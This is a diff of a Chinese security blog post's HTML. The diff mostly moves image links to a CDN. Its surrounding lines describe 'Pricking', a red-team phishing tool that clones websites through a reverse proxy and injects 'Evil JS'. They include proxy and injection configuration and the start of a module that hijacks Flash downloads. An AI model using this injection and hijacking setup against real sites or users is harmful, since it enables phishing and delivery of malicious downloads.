@@ -149,7 +149,10 @@ http {
 </code></pre><p>当OpenResty环境以<code>nginx.conf</code>作为配置文件启动的话，访问网站会输出<code>Hello,Rvn0xsy</code>。</p>
 <h3 id="lua-ngx-api---block">Lua Ngx API - Block</h3>
 <p>《OpenResty 最佳实践》中提供了一个流程图：</p>
-<p><img src="../../../static/images/b04661e2-4f5f-11ec-ad0b-00d861bf4abb.png" alt="2021-02-16-16-48-59"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b04661e2-4f5f-11ec-ad0b-00d861bf4abb.png" alt="2021-02-16-16-48-59"  />
+  </p></p>
 <p>根据这个流程图，可以将Lua代码放入不同的流程中对数据进行修改、删除、添加等。</p>
 <p>如上面的<code>Hello,Rvn0xsy</code>例子，就是通过<code>content_by_lua_block</code>这个环节对响应内容进行修改。</p>
 <p>本文用到的Block有：</p>
@@ -215,7 +218,10 @@ http {
 <h3 id="使用es6标准将js模块化">使用ES6+标准将JS模块化</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/7276df76835ed2272cc0e59f55e49902/static.js&#39;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;module&#39;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span></code></pre></div><p>其中<code>static.js</code>就是引入的Evil JS，添加了<code>type='module'</code>是为了启用<a href="https://www.freecodecamp.org/news/learn-modern-javascript/">ES6+</a>标准。</p>
-<p><img src="../../../static/images/b087b05c-4f5f-11ec-8b14-00d861bf4abb.png" alt="2021-02-16-17-10-54"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b087b05c-4f5f-11ec-8b14-00d861bf4abb.png" alt="2021-02-16-17-10-54"  />
+  </p></p>
 <p>为了不和源站的目录冲突，<code>7276df76835ed2272cc0e59f55e49902</code>其实是一个虚拟的目录，通过<code>location</code>映射即可。</p>
 <pre tabindex="0"><code>location ^~ /7276df76835ed2272cc0e59f55e49902/ {
                 alias    /tmp/pricking/static/;
@@ -348,9 +354,15 @@ ENTRYPOINT [&#34;/tmp/docker-entrypoint.sh&#34;]
 </span></span><span style="display:flex;"><span>      <span style="color:#f92672">PROXY_SOURCE_HOST</span>: <span style="color:#ae81ff">payloads.online</span>
 </span></span><span style="display:flex;"><span>      <span style="color:#f92672">NGINX_LISTEN_PORT</span>: <span style="color:#ae81ff">80</span>
 </span></span><span style="display:flex;"><span>      <span style="color:#f92672">EVIL_JS_URI</span>: <span style="color:#ae81ff">b026324c6904b2a9cb4b88d6d61c81d1</span>
-</span></span></code></pre></div><p><img src="../../../static/images/b0c41b32-4f5f-11ec-a953-00d861bf4abb.png" alt="2021-02-16-17-40-24"></p>
+</span></span></code></pre></div><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b0c41b32-4f5f-11ec-a953-00d861bf4abb.png" alt="2021-02-16-17-40-24"  />
+  </p></p>
 <p>日志：</p>
-<p><img src="../../../static/images/b1008158-4f5f-11ec-b052-00d861bf4abb.png" alt="2021-02-16-17-41-55"></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/b1008158-4f5f-11ec-b052-00d861bf4abb.png" alt="2021-02-16-17-41-55"  />
+  </p></p>
 <h2 id="0x03-golang实现---快速部署与完美克隆">0x03 Golang实现 - 快速部署与完美克隆</h2>
 <p>通过Google搜索“Golang http reverse proxy”发现，官方在标准库中已经包含了实现反向代理的代码：<a href="https://pkg.go.dev/net/http/httputil#NewSingleHostReverseProxy">ReverseProxy</a></p>
 <p>示例代码：<a href="https://blog.joshsoftware.com/2021/05/25/simple-and-powerful-reverseproxy-in-go/">Simple and Powerful ReverseProxy in Go</a></p>
@@ -459,17 +471,32 @@ $ make
 </span></span><span style="display:flex;"><span><span style="color:#f92672">listen_address</span>: <span style="color:#e6db74">&#34;192.168.117.1:9999&#34;</span> <span style="color:#75715e"># 监听地址:端口</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">inject_body</span>: <span style="color:#e6db74">&#34;&lt;script src=&#39;/pricking_static_files/static.js&#39; type=&#39;module&#39;&gt;&lt;/script&gt;&#34;</span> <span style="color:#75715e"># 注入代码</span>
 </span></span></code></pre></div><p>Pricking是支持HTTPS反向代理的，我的博客刚好是HTTPS加密的，所以能把HTTPS转换为HTTP。</p>
-<p><img src="../../../static/images/2021-12-24-14-00-37.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-00-37.png" alt=""  />
+  </p></p>
 <p>启动Pricking，<strong>确保配置文件、Static在当前目录</strong>：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./pricking -url https://payloads.online
 </span></span><span style="display:flex;"><span>2021/12/24 14:03:33 Loading config  ./config.yaml
-</span></span></code></pre></div><p><img src="../../../static/images/2021-12-24-14-10-18.png" alt=""></p>
+</span></span></code></pre></div><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-10-18.png" alt=""  />
+  </p></p>
 <p>代理效果：</p>
-<p><img src="../../../static/images/2021-12-24-14-05-09.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-05-09.png" alt=""  />
+  </p></p>
 <p>查看页面底部：</p>
-<p><img src="../../../static/images/2021-12-24-14-06-25.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-06-25.png" alt=""  />
+  </p></p>
 <p>代码已经成功注入，<a href="https://github.com/Rvn0xsy/Pricking/tree/main/static">static.js</a>中的代码就是用于引用<a href="https://github.com/Rvn0xsy/Pricking/tree/main/static">Pricking Js Suite</a>的内容进行加载执行。</p>
-<p><img src="../../../static/images/2021-12-24-14-14-00.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-24-14-14-00.png" alt=""  />
+  </p></p>
 <h2 id="0x04-nodejs实现---快速部署与完美克隆">0x04 NodeJS实现 - 快速部署与完美克隆</h2>
 <p><a href="https://github.com/Rvn0xsy/Pricking-node">Pricking-node</a> 实现效果与<a href="https://github.com/Rvn0xsy/Pricking">Pricking</a>类似，但我感觉JS好像更加简洁、方便，因此对照<a href="https://www.npmjs.com/package/http-proxy-middleware">http-proxy-middleware</a>模块编写了一个反向代理脚本。</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">createProxyMiddleware</span>, <span style="color:#a6e22e">responseInterceptor</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;http-proxy-middleware&#39;</span>);
@@ -524,12 +551,21 @@ $ node proxy.js
 </table>
 <h3 id="劫持flash下载">劫持Flash下载</h3>
 <p><a href="https://github.com/Rvn0xsy/Pricking-node/blob/main/pricking-js-suite/modules/flash.cn.js">劫持Flash的代码</a>已经提交到pricking-js-suite，在这里我演示一下：</p>
-<p><img src="../../../static/images/2021-12-31-13-04-52.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-04-52.png" alt=""  />
+  </p></p>
 <p>将flash模块启用：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ vim pricking-js-suite/static.js
-</span></span></code></pre></div><p><img src="../../../static/images/2021-12-31-13-07-50.png" alt=""></p>
+</span></span></code></pre></div><p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-07-50.png" alt=""  />
+  </p></p>
 <p>访问: http://localhost:3000 点击立即下载将会触发js代码。</p>
-<p><img src="../../../static/images/2021-12-31-13-09-42.png" alt=""></p>
+<p><p class="md__image">
+    
+    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/2021-12-31-13-09-42.png" alt=""  />
+  </p></p>
 <p>flash模块的代码如下：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Loaded flash.cn Module ...&#34;</span>);
 </span></span><span style="display:flex;"><span>
